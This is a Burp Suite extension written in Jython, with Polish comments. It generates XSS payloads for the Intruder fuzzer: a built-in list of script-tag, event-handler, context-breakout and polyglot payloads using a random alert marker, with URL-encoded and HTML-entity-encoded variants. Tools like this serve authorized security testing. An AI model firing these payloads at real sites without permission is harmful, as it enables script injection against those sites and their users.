# -*- coding: utf-8 -*-
"""
PortSwigger XSS Cheatsheet Generator - wersja rozszerzona
-----------------------------------------------------------
Rozszerzenie do Burp Suite (Jython) generujace payloady XSS
dla Intrudera, z obsluga:
  - unikalnego markera zamiast statycznego alert(1)
  - wariantow kodowania (URL, HTML entity, double-encode)
  - wczytywania wlasnej listy payloadow z pliku
  - kontekstowego wstrzykiwania (uzycie baseValue)
  - logowania do zakladki Output rozszerzenia
"""

from burp import IBurpExtender
from burp import IIntruderPayloadGeneratorFactory
from burp import IIntruderPayloadGenerator
from burp import ITab

from javax.swing import (JPanel, JButton, JFileChooser, JLabel, JCheckBox,
                          JTextField, BoxLayout, JScrollPane, JTextArea)
from java.awt import BorderLayout, FlowLayout
from java.net import URLEncoder
import random
import string


DEFAULT_PAYLOADS = [
    # Basic HTML Context
    '<script>alert({MARK})</script>',
    '<img src=x onerror=alert({MARK})>',
    '<svg onload=alert({MARK})>',
    '<iframe src="javascript:alert({MARK})">',

    # Attribute Context / Event Handlers
    '" onfocus=alert({MARK}) autofocus="',
    "' onfocus=alert({MARK}) autofocus='",
    '"><script>alert({MARK})</script>',
    '"><img src=x onerror=alert({MARK})>',

    # JavaScript Context
    ';alert({MARK})//',
    "'-alert({MARK})-'",
    '"-alert({MARK})-"',
    '</script><script>alert({MARK})</script>',

    # Modern HTML5 / Polyglots / Bypasses
    '<body onload=alert({MARK})>',
    '<details open ontoggle=alert({MARK})>',
    '<custom-element onanimationstart=alert({MARK})>',
    '<math><mtext><option><fake-tag><style><img src=x onerror=alert({MARK})>',
    'javascript:alert({MARK})',
]


def random_marker(length=6):
    return ''.join(random.choice(string.ascii_lowercase) for _ in range(length))


def html_entity_encode(s):
    return ''.join('&#x%02x;' % ord(c) for c in s)


def url_encode(s):
    return URLEncoder.encode(s, 'UTF-8')


class BurpExtender(IBurpExtender, IIntruderPayloadGeneratorFactory, ITab):

    EXT_NAME = "PortSwigger XSS Cheatsheet Generator"

    def registerExtenderCallbacks(self, callbacks):
        self._callbacks = callbacks
        self._helpers = callbacks.getHelpers()

        # Konfiguracja domyslna (modyfikowalna z panelu UI)
        self.config = {
            "use_random_marker": True,
            "include_url_encoded": True,
            "include_html_encoded": True,
            "wrap_base_value": False,   # True: baseValue + payload zamiast samego payloadu
            "custom_payload_file": None,
        }

        callbacks.setExtensionName(self.EXT_NAME)
        callbacks.registerIntruderPayloadGeneratorFactory(self)

        self._build_ui()
        callbacks.addSuiteTab(self)

        self._log("Rozszerzenie zaladowane pomyslnie. %d payloadow bazowych." % len(DEFAULT_PAYLOADS))

    def _log(self, msg):
        self._callbacks.printOutput("[XSS-Gen] %s" % msg)

    # --- Prosty panel ustawien w Burpie (zakladka) ---
    def _build_ui(self):
        self._panel = JPanel()
        self._panel.setLayout(BoxLayout(self._panel, BoxLayout.Y_AXIS))

        self._chk_random = JCheckBox("Uzyj losowego markera zamiast alert(1)", True)
        self._chk_url = JCheckBox("Dolacz warianty URL-encoded", True)
        self._chk_html = JCheckBox("Dolacz warianty HTML-entity-encoded", True)
        self._chk_wrap = JCheckBox("Wstrzykuj w kontekst baseValue (baseValue + payload)", False)

        load_btn = JButton("Wczytaj wlasna liste payloadow (.txt)", actionPerformed=self._load_file)
        reset_btn = JButton("Przywroc domyslna liste", actionPerformed=self._reset_file)

        self._status = JTextArea("Aktywna lista: domyslna (%d payloadow)" % len(DEFAULT_PAYLOADS))
        self._status.setEditable(False)

        for comp in (self._chk_random, self._chk_url, self._chk_html, self._chk_wrap,
                     load_btn, reset_btn, JScrollPane(self._status)):
            self._panel.add(comp)

    def getTabCaption(self):
        return "XSS Gen"

    def getUiComponent(self):
        return self._panel

    def _load_file(self, event):
        chooser = JFileChooser()
        result = chooser.showOpenDialog(self._panel)
        if result == JFileChooser.APPROVE_OPTION:
            path = chooser.getSelectedFile().getAbsolutePath()
            self.config["custom_payload_file"] = path
            self._status.setText("Aktywna lista: %s" % path)
            self._log("Wczytano wlasna liste payloadow z: %s" % path)

    def _reset_file(self, event):
        self.config["custom_payload_file"] = None
        self._status.setText("Aktywna lista: domyslna (%d payloadow)" % len(DEFAULT_PAYLOADS))
        self._log("Przywrocono domyslna liste payloadow.")

    # --- Payload generator factory ---
    def getGeneratorName(self):
        return "PortSwigger XSS Cheatsheet Payloads"

    def createNewInstance(self, attack):
        self._chk_random_sync()
        return XSSPayloadGenerator(self._current_payload_templates(), self.config, self._log)

    def _chk_random_sync(self):
        # synchronizuj checkboxy UI -> config przed kazdym nowym atakiem
        self.config["use_random_marker"] = self._chk_random.isSelected()
        self.config["include_url_encoded"] = self._chk_url.isSelected()
        self.config["include_html_encoded"] = self._chk_html.isSelected()
        self.config["wrap_base_value"] = self._chk_wrap.isSelected()

    def _current_payload_templates(self):
        path = self.config.get("custom_payload_file")
        if path:
            try:
                with open(path, "r") as f:
                    lines = [l.strip() for l in f.readlines() if l.strip()]
                if lines:
                    return lines
            except Exception as e:
                self._log("Blad wczytywania pliku, uzywam domyslnej listy: %s" % str(e))
        return DEFAULT_PAYLOADS


class XSSPayloadGenerator(IIntruderPayloadGenerator):
    """
    Generuje pelna liste payloadow (baza + warianty kodowania) raz,
    przy tworzeniu instancji, potem serwuje je liniowo Intruderowi.
    """

    def __init__(self, templates, config, log_fn):
        self._config = config
        self._log = log_fn
        self._marker = random_marker() if config.get("use_random_marker") else "1"
        self._payloads = self._expand(templates)
        self._offset = 0
        self._log("Nowy atak: marker=%s, %d payloadow po ekspansji." %
                   (self._marker, len(self._payloads)))

    def _expand(self, templates):
        expanded = []
        for tpl in templates:
            base = tpl.replace("{MARK}", self._marker) if "{MARK}" in tpl else tpl
            expanded.append(base)

            if self._config.get("include_url_encoded"):
                expanded.append(url_encode(base))

            if self._config.get("include_html_encoded"):
                expanded.append(html_entity_encode(base))

        return expanded

    def hasMorePayloads(self):
        return self._offset < len(self._payloads)

    def getNextPayload(self, baseValue):
        payload = self._payloads[self._offset]
        self._offset += 1

        if self._config.get("wrap_base_value") and baseValue:
            try:
                base_str = baseValue.tostring() if hasattr(baseValue, "tostring") else str(baseValue)
            except Exception:
                base_str = ""
            return (base_str + payload).encode("utf-8")

        return payload.encode("utf-8")

    def reset(self):
        self._offset = 0
